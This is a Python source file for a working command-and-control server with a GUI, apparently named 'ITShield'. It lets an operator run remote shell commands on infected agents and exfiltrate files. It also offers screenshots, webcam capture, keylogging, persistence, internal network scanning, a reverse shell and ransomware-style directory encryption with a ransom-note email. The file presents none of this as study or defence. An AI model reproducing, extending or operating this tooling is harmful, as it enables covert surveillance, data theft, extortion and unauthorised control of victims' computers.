# server.py
import socket
import threading
import json
import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox
import os
import struct
import time

# --- Configuration ---
HOST = "0.0.0.0"
PORT = 8888
REVERSE_SHELL_PORT = 5555

def recv_data(sock):
    header = sock.recv(4)
    if not header: return None
    data_len = struct.unpack('!I', header)[0]
    received_data = b""
    while len(received_data) < data_len:
        chunk = sock.recv(data_len - len(received_data))
        if not chunk: return None
        received_data += chunk
    return received_data.decode('utf-8')

class C2Server:
    def __init__(self, root):
        self.root = root
        self.root.title("ITShield C2 Server")
        self.server_socket = None
        self.clients = {} # {socket: (address, info)}
        self.selected_client_socket = None
        self.selected_client_addr = None
        self.rev_shell_conn = None
        
        self.setup_gui()
        self.start_server()

    def setup_gui(self):
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        left_panel = ttk.Frame(main_frame)
        left_panel.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S), padx=(0, 10))

        ttk.Label(left_panel, text="Connected Agents:").pack(anchor=tk.W)
        self.agent_listbox = tk.Listbox(left_panel, height=8, width=30, exportselection=False)
        self.agent_listbox.pack(fill=tk.BOTH, expand=True, pady=5)
        self.agent_listbox.bind('<<ListboxSelect>>', self.on_agent_select)

        agent_details_frame = ttk.LabelFrame(left_panel, text="Selected Agent Details", padding="10")
        agent_details_frame.pack(fill=tk.X, pady=10)
        self.agent_details_text = tk.Text(agent_details_frame, height=10, width=30, state=tk.DISABLED)
        self.agent_details_text.pack()

        right_panel = ttk.Frame(main_frame)
        right_panel.grid(row=0, column=1, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        self.notebook = ttk.Notebook(right_panel)
        self.notebook.pack(fill=tk.BOTH, expand=True)

        self.setup_main_tab()
        self.setup_file_manager_tab()
        self.setup_surveillance_tab()
        self.setup_persistence_tab()
        self.setup_lateral_movement_tab()
        self.setup_reverse_shell_tab()
        self.setup_dangerous_tab()
        
        output_frame = ttk.LabelFrame(main_frame, text="Output", padding="10")
        output_frame.grid(row=1, column=0, columnspan=2, sticky=(tk.W, tk.E, tk.N, tk.S), pady=10)
        self.output_text = scrolledtext.ScrolledText(output_frame, height=10, width=100)
        self.output_text.grid(row=0, column=0)

        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)
        main_frame.columnconfigure(1, weight=1)
        main_frame.rowconfigure(0, weight=1)
        main_frame.rowconfigure(1, weight=0)

    def setup_main_tab(self):
        tab = ttk.Frame(self.notebook); self.notebook.add(tab, text="Main Control")
        ttk.Label(tab, text="Execute Shell Command:").grid(row=0, column=0, sticky=tk.W, padx=5, pady=2)
        self.shell_entry = ttk.Entry(tab, width=60); self.shell_entry.grid(row=0, column=1, padx=5, pady=2)
        self.shell_entry.insert(0, "whoami")
        ttk.Button(tab, text="Execute", command=self.execute_shell).grid(row=0, column=2, padx=5, pady=2)
        ttk.Label(tab, text="List Directory:").grid(row=1, column=0, sticky=tk.W, padx=5, pady=2)
        self.path_entry = ttk.Entry(tab, width=60); self.path_entry.grid(row=1, column=1, padx=5, pady=2)
        self.path_entry.insert(0, "C:\\" if os.name == 'nt' else "/")
        ttk.Button(tab, text="List", command=self.list_dir).grid(row=1, column=2, padx=5, pady=2)

    def setup_file_manager_tab(self):
        tab = ttk.Frame(self.notebook); self.notebook.add(tab, text="File Manager")
        # Download
        ttk.Label(tab, text="Download from Agent:").grid(row=0, column=0, sticky=tk.W, padx=5, pady=2)
        self.download_path_entry = ttk.Entry(tab, width=60); self.download_path_entry.grid(row=0, column=1, padx=5, pady=2)
        ttk.Button(tab, text="Download", command=self.download_file).grid(row=0, column=2, padx=5, pady=2)
        # Upload
        ttk.Label(tab, text="Upload to Agent:").grid(row=1, column=0, sticky=tk.W, padx=5, pady=2)
        self.upload_path_label = ttk.Label(tab, text="No file selected", width=60); self.upload_path_label.grid(row=1, column=1, padx=5, pady=2, sticky=tk.W)
        self.upload_file_path = None
        ttk.Button(tab, text="Select File", command=self.select_upload_file).grid(row=1, column=2, padx=5, pady=2)
        ttk.Label(tab, text="Target Path on Agent:").grid(row=2, column=0, sticky=tk.W, padx=5, pady=2)
        self.upload_target_path_entry = ttk.Entry(tab, width=60); self.upload_target_path_entry.grid(row=2, column=1, padx=5, pady=2)
        self.upload_target_path_entry.insert(0, "C:\\uploaded_file.txt" if os.name == 'nt' else "/tmp/uploaded_file.txt")
        ttk.Button(tab, text="Upload", command=self.upload_file).grid(row=2, column=2, padx=5, pady=2)
        # Delete & Search
        ttk.Label(tab, text="Delete File on Agent:").grid(row=3, column=0, sticky=tk.W, padx=5, pady=2)
        self.delete_path_entry = ttk.Entry(tab, width=60); self.delete_path_entry.grid(row=3, column=1, padx=5, pady=2)
        ttk.Button(tab, text="Delete", command=self.delete_file).grid(row=3, column=2, padx=5, pady=2)
        ttk.Label(tab, text="Search for Extension:").grid(row=4, column=0, sticky=tk.W, padx=5, pady=2)
        self.search_ext_entry = ttk.Entry(tab, width=20); self.search_ext_entry.grid(row=4, column=1, padx=5, pady=2, sticky=tk.W)
        self.search_ext_entry.insert(0, ".pdf")
        ttk.Button(tab, text="Search", command=self.search_files).grid(row=4, column=2, padx=5, pady=2)

    def setup_surveillance_tab(self):
        tab = ttk.Frame(self.notebook); self.notebook.add(tab, text="Surveillance")
        ttk.Button(tab, text="Get System Information", command=self.get_system_info).pack(pady=5)
        ttk.Button(tab, text="Take Screenshot", command=self.get_screenshot).pack(pady=5)
        ttk.Button(tab, text="Get Webcam Snapshot", command=self.get_webcam_snapshot).pack(pady=5)
        ttk.Button(tab, text="List Users", command=self.list_users).pack(pady=5)
        ttk.Button(tab, text="List Software", command=self.list_software).pack(pady=5)
        ttk.Separator(tab, orient='horizontal').pack(fill='x', pady=10)
        ttk.Button(tab, text="Start Keylogger", command=self.start_keylogger).pack(pady=5)
        ttk.Button(tab, text="Get Keylogs", command=self.get_keylogs).pack(pady=5)

    def setup_persistence_tab(self):
        tab = ttk.Frame(self.notebook); self.notebook.add(tab, text="Persistence")
        ttk.Label(tab, text="Add agent to system startup.").pack(pady=20)
        ttk.Button(tab, text="Add Persistence", command=self.add_persistence).pack(pady=10)

    def setup_lateral_movement_tab(self):
        tab = ttk.Frame(self.notebook); self.notebook.add(tab, text="Lateral Movement")
        ttk.Label(tab, text="Scan Internal Network (e.g., 192.168.1):").pack(pady=5)
        self.scan_ip_entry = ttk.Entry(tab, width=20); self.scan_ip_entry.pack(pady=5)
        self.scan_ip_entry.insert(0, "192.168.1")
        ttk.Label(tab, text="Ports (comma-separated):").pack(pady=5)
        self.scan_ports_entry = ttk.Entry(tab, width=40); self.scan_ports_entry.pack(pady=5)
        self.scan_ports_entry.insert(0, "22,80,443,3389")
        ttk.Button(tab, text="Start Scan", command=self.scan_network).pack(pady=10)
        ttk.Separator(tab, orient='horizontal').pack(fill='x', pady=10)
        ttk.Button(tab, text="List Processes", command=self.list_processes).pack(pady=10)
        ttk.Label(tab, text="Kill Process by PID:").pack()
        self.kill_pid_entry = ttk.Entry(tab, width=20); self.kill_pid_entry.pack(pady=5)
        ttk.Button(tab, text="Kill", command=self.kill_process).pack()

    def setup_reverse_shell_tab(self):
        tab = ttk.Frame(self.notebook); self.notebook.add(tab, text="Reverse Shell")
        ttk.Label(tab, text="Interactive shell with the selected agent.").pack(pady=10)
        self.rev_shell_output = scrolledtext.ScrolledText(tab, height=15, width=80, state=tk.DISABLED)
        self.rev_shell_output.pack(pady=5, padx=5, fill=tk.BOTH, expand=True)
        command_frame = ttk.Frame(tab); command_frame.pack(fill=tk.X, pady=5, padx=5)
        self.rev_shell_entry = ttk.Entry(command_frame)
        self.rev_shell_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        self.rev_shell_entry.bind("<Return>", self.send_rev_shell_command)
        ttk.Button(command_frame, text="Send", command=self.send_rev_shell_command).pack(side=tk.RIGHT)
        ttk.Button(tab, text="Connect to Agent", command=self.start_reverse_shell_listener).pack(pady=5)

    def setup_dangerous_tab(self):
        tab = ttk.Frame(self.notebook); self.notebook.add(tab, text="DANGEROUS ACTIONS")
        encrypt_frame = ttk.LabelFrame(tab, text="Directory Encryption", padding="20"); encrypt_frame.pack(pady=20, padx=20, fill=tk.BOTH, expand=True)
        ttk.Label(encrypt_frame, text="Directory Path:").grid(row=0, column=0, sticky=tk.W)
        self.encrypt_path_entry = ttk.Entry(encrypt_frame, width=40); self.encrypt_path_entry.grid(row=0, column=1)
        self.encrypt_path_entry.insert(0, "C:\\test_folder" if os.name == 'nt' else "/tmp/test_folder")
        ttk.Label(encrypt_frame, text="Encryption Key:").grid(row=1, column=0, sticky=tk.W)
        self.encrypt_key_entry = ttk.Entry(encrypt_frame, width=40); self.encrypt_key_entry.grid(row=1, column=1)
        self.encrypt_key_entry.insert(0, "mysecretkey")
        ttk.Label(encrypt_frame, text="Email for Ransom Note:").grid(row=2, column=0, sticky=tk.W)
        self.encrypt_email_entry = ttk.Entry(encrypt_frame, width=40); self.encrypt_email_entry.grid(row=2, column=1)
        self.encrypt_email_entry.insert(0, "payme@restore.com")
        ttk.Button(encrypt_frame, text="ENCRYPT DIRECTORY!", command=self.encrypt_dir).grid(row=3, column=0, columnspan=2, pady=20)

    # --- GUI Logic ---
    def log(self, message):
        self.output_text.insert(tk.END, message + "\n")
        self.output_text.see(tk.END)

    def on_agent_select(self, event):
        selection_indices = self.agent_listbox.curselection()
        if not selection_indices:
            self.selected_client_socket = None
            self.selected_client_addr = None
            return
        selected_agent_info = self.agent_listbox.get(selection_indices[0])
        for sock, client_data in self.clients.items():
            addr, info = client_data
            if f"{addr[0]}:{addr[1]}" == selected_agent_info:
                self.selected_client_socket = sock
                self.selected_client_addr = addr
                self.update_agent_details(info)
                return
        self.selected_client_socket = None
        self.selected_client_addr = None

    def update_agent_details(self, info):
        self.agent_details_text.config(state=tk.NORMAL)
        self.agent_details_text.delete(1.0, tk.END)
        if isinstance(info, dict):
            for key, value in info.items():
                self.agent_details_text.insert(tk.END, f"{key}: {value}\n")
        self.agent_details_text.config(state=tk.DISABLED)

    def get_selected_client_socket(self):
        if not self.selected_client_socket:
            messagebox.showwarning("Warning", "Please select an agent from the list.")
            return None
        return self.selected_client_socket

    def send_command(self, command):
        client_socket = self.get_selected_client_socket()
        if client_socket:
            try:
                json_data = json.dumps(command).encode('utf-8')
                data_len = len(json_data)
                client_socket.sendall(struct.pack('!I', data_len))
                client_socket.sendall(json_data)
            except Exception as e:
                self.log(f"[-] Error sending command: {e}")
                self.remove_client(client_socket)

    # --- Command Functions ---
    def execute_shell(self): self.send_command({"type": "execute_shell", "command": self.shell_entry.get()})
    def list_dir(self): self.send_command({"type": "list_dir", "path": self.path_entry.get()})
    def download_file(self): self.send_command({"type": "download_file", "path": self.download_path_entry.get()})
    def delete_file(self): self.send_command({"type": "delete_file", "path": self.delete_path_entry.get()})
    def search_files(self): self.send_command({"type": "search_files", "extension": self.search_ext_entry.get()})
    def list_processes(self): self.send_command({"type": "list_processes"})
    def kill_process(self): self.send_command({"type": "kill_process", "pid": self.kill_pid_entry.get()})
    def get_system_info(self): self.send_command({"type": "get_system_info"})
    def get_screenshot(self): self.send_command({"type": "get_screenshot"})
    def list_users(self): self.send_command({"type": "list_users"})
    def list_software(self): self.send_command({"type": "list_software"})
    def start_keylogger(self): self.send_command({"type": "start_keylogger"})
    def get_keylogs(self): self.send_command({"type": "get_keylogs"})
    def get_webcam_snapshot(self): self.send_command({"type": "get_webcam_snapshot"})
    def add_persistence(self): self.send_command({"type": "add_persistence"})
    def scan_network(self):
        base_ip = self.scan_ip_entry.get()
        ports_str = self.scan_ports_entry.get()
        ports = [int(p.strip()) for p in ports_str.split(',')]
        self.send_command({"type": "scan_network", "base_ip": base_ip, "ports": ports})
    def encrypt_dir(self):
        path = self.encrypt_path_entry.get(); key = self.encrypt_key_entry.get(); email = self.encrypt_email_entry.get()
        if not all([path, key, email]): messagebox.showwarning("Warning", "All encryption fields must be filled."); return
        result = messagebox.askyesno("Final Confirmation", f"Are you SURE you want to encrypt ALL files in '{path}'?", icon='warning')
        if result: self.send_command({"type": "encrypt_dir", "path": path, "key": key, "email": email})

    def select_upload_file(self):
        self.upload_file_path = filedialog.askopenfilename()
        if self.upload_file_path:
            self.upload_path_label.config(text=self.upload_file_path.split('/')[-1])

    def upload_file(self):
        if not self.upload_file_path: messagebox.showwarning("Warning", "Please select a file to upload first."); return
        try:
            with open(self.upload_file_path, "rb") as f: file_data = f.read()
            path_on_target = self.upload_target_path_entry.get()
            command = {"type": "upload_file", "path": path_on_target, "data": file_data.hex()}
            self.send_command(command)
            self.log(f"[+] Upload request for '{os.path.basename(self.upload_file_path)}' to '{path_on_target}' sent.")
        except Exception as e: messagebox.showerror("Error", f"Error reading file: {e}")

    # --- Reverse Shell Logic ---
    def start_reverse_shell_listener(self):
        if not self.selected_client_addr:
            messagebox.showwarning("Warning", "Select an agent first.")
            return
        self.send_command({"type": "start_reverse_shell"})
        self.log(f"[*] Reverse shell command sent. Waiting for agent to listen on port {REVERSE_SHELL_PORT}...")
        self.root.after(2000, self._connect_to_rev_shell) # Wait 2 seconds for agent to start listening

    def _connect_to_rev_shell(self):
        if not self.selected_client_addr: return
        self.log(f"[*] Attempting to connect to reverse shell at {self.selected_client_addr[0]}:{REVERSE_SHELL_PORT}")
        try:
            self.rev_shell_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.rev_shell_conn.connect((self.selected_client_addr[0], REVERSE_SHELL_PORT))
            self.log("[+] Connected to reverse shell!")
            threading.Thread(target=self.rev_shell_receiver, daemon=True).start()
        except Exception as e:
            self.log(f"[-] Failed to connect to reverse shell: {e}")
            self.rev_shell_conn = None

    def rev_shell_receiver(self):
        while self.rev_shell_conn:
            try:
                response_data = recv_data(self.rev_shell_conn)
                if not response_data: break
                response = json.loads(response_data)
                output = response.get("output", "")
                error = response.get("error", "")
                self.rev_shell_output.config(state=tk.NORMAL)
                self.rev_shell_output.insert(tk.END, output + error)
                self.rev_shell_output.see(tk.END)
                self.rev_shell_output.config(state=tk.DISABLED)
            except Exception as e:
                self.log(f"[-] Reverse shell receiver error: {e}")
                break
        self.log("[-] Reverse shell connection closed.")
        self.rev_shell_conn = None

    def send_rev_shell_command(self, event=None):
        command = self.rev_shell_entry.get()
        if not command or not self.rev_shell_conn: return
        try:
            self.rev_shell_conn.sendall(command.encode('utf-8') + b'\n')
            self.rev_shell_entry.delete(0, tk.END)
        except Exception as e:
            self.log(f"[-] Error sending command to reverse shell: {e}")
            self.rev_shell_conn = None

    # --- Server Logic ---
    def start_server(self):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.bind((HOST, PORT))
            self.server_socket.listen(5)
            self.log(f"[+] Server listening on {HOST}:{PORT}")
            accept_thread = threading.Thread(target=self.accept_clients, daemon=True)
            accept_thread.start()
        except Exception as e:
            self.log(f"[-] Failed to start server: {e}")
            messagebox.showerror("Error", f"Could not start server: {e}")

    def accept_clients(self):
        while True:
            try:
                client_socket, addr = self.server_socket.accept()
                initial_info_data = recv_data(client_socket)
                initial_info = json.loads(initial_info_data) if initial_info_data else {}
                self.clients[client_socket] = (addr, initial_info.get("data", {}))
                self.agent_listbox.insert(tk.END, f"{addr[0]}:{addr[1]}")
                self.log(f"[+] New connection from {addr}")
                handle_thread = threading.Thread(target=self.handle_client, args=(client_socket,), daemon=True)
                handle_thread.start()
            except Exception as e:
                self.log(f"[-] Error accepting client: {e}")

    def handle_client(self, client_socket):
        while True:
            try:
                response_data = recv_data(client_socket)
                if not response_data: break
                response = json.loads(response_data)
                self.log(f"\n--- Response from {self.clients[client_socket][0][0]} ---")
                if response.get("status") == "success":
                    cmd_type = response.get("command_type")
                    if cmd_type == "download_file":
                        file_data_hex = response.get("data")
                        original_filename = response.get("filename", "downloaded_file")
                        save_path = filedialog.asksaveasfilename(initialfile=original_filename, title="Save Downloaded File As...", defaultextension=".bin")
                        if save_path:
                            try:
                                file_data = bytes.fromhex(file_data_hex)
                                with open(save_path, "wb") as f: f.write(file_data)
                                self.log(f"[+] File '{original_filename}' downloaded and saved to:\n{save_path}")
                            except Exception as e: self.log(f"[-] Error saving file: {e}")
                        else: self.log("[*] File download cancelled by user.")
                    elif cmd_type in ["screenshot", "webcam_snapshot"]:
                        img_hex = response.get("data")
                        default_name = "screenshot.png" if cmd_type == "screenshot" else "webcam.jpg"
                        save_path = filedialog.asksaveasfilename(initialfile=default_name, title=f"Save {cmd_type.replace('_',' ').title()} As...", defaultextension=".png")
                        if save_path:
                            try:
                                img_data = bytes.fromhex(img_hex)
                                with open(save_path, "wb") as f: f.write(img_data)
                                self.log(f"[+] {cmd_type.replace('_',' ').title()} saved to:\n{save_path}")
                            except Exception as e: self.log(f"[-] Error saving {cmd_type}: {e}")
                    else:
                        data = response.get("data")
                        if isinstance(data, list):
                            for item in data: self.log(item)
                        else:
                            self.log(str(data))
                else:
                    self.log(f"Error: {response.get('message')}")
                self.log("------------------------------------")
            except Exception as e:
                self.log(f"[-] Error receiving data from client: {e}")
                break
        self.log(f"[-] Client {self.clients[client_socket][0][0]} disconnected.")
        self.remove_client(client_socket)

    def remove_client(self, client_socket):
        if client_socket in self.clients:
            addr, _ = self.clients[client_socket]
            self.clients.pop(client_socket)
            for i in range(self.agent_listbox.size()):
                if self.agent_listbox.get(i) == f"{addr[0]}:{addr[1]}":
                    self.agent_listbox.delete(i)
                    break
            if self.selected_client_socket == client_socket:
                self.selected_client_socket = None
                self.selected_client_addr = None
                self.agent_details_text.config(state=tk.NORMAL)
                self.agent_details_text.delete(1.0, tk.END)
                self.agent_details_text.config(state=tk.DISABLED)
            client_socket.close()

if __name__ == "__main__":
    root = tk.Tk()
    app = C2Server(root)
    root.mainloop()
